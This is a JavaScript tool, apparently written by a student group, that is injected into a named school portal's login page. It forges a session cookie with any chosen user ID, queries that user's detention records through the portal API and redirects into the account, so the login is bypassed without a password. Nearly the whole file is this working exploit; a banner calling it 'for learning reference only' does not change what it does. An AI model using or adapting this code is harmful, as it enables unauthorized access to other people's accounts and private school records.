/* XueWu System Core Javascript version 1.8
 * (C)opyright 2024 KCISHackers.
 * All Rights reserved.
 * Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.
 */
console.log("Hello from XueWu System Core Javascript. (C)opyright 2024 KCISHackers. All Rights reserved. Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.");
console.log("XueWu: Ciallo～(∠・ω< )⌒★");
/*
 * Debug log. Set 'tweaker_debug' to true to enable
 */
var tweaker_debug=true;
function log(info){
    tweaker_debug&&console.log(info);
}
/* Tweaking function. It should be injected into portal.kciesc.com/China/Account/Login page
 * Redirect to /DSAI/Home to validate the tweak after running.
 */
function tweak(id){
    log("Tweaking "+id);
    /*Create fake login cookie*/
    document.cookie="DSAI="+id+";path=/";
    /*Fetch API to get new tweaked session*/
    log("Detention API returned:");
    fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=')
    .then(response=>response.json()).then(data=>log(data))
    .catch(error=>(function(){
        console.error(error);
        if(error.name=='SyntaxError'){
            alert(id+' does not seem to exist. Check your spelling.');
            return;
        }
        alert("Error while tweaking "+id+"! "+error);
    }()))
}
/* Visual interface (Tweaking DOM) */
function core(){
    console.log("Hello from XueWuSystem: Ciallo～(∠・ω< )⌒★")
    if(document.getElementById("tweaked")){
        alert('This page had already been tweaked! Do not run twice!');
        return;
    }
    /*Code for clicking submit button*/
    function btn_onclick(){
        if(document.getElementById("UserId").value==''){
            alert('Username field cannot be empty!');
            return;
        }
        tweak(document.getElementById("UserId").value);
        log("done tweaking, redirecting to /DSAI/Home");
        window.location.href="/DSAI/Home";
    }
    /*Details*/
    document.getElementsByClassName("main_logout")[0].innerText="tweaked by 学武系统tweaker";
    document.getElementsByClassName("ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset")[1].
    innerHTML="<div style=\"color:red\">This program is for learning reference only, rather than abusing, or you'll take the risk!</div>";
    document.getElementById("UserId").addEventListener("keyup",function(event){
        if(event.keyCode===13){
            event.preventDefault();
            btn_onclick();
        }
    });
    document.getElementsByName('btn_s')[0].addEventListener("click",btn_onclick);
    var mark=document.createElement('div');
    mark.id='tweaked';
    document.body.appendChild(mark);
}
/*This script should be injected into portal.kciesc.com/China/Account/Login page*/
core();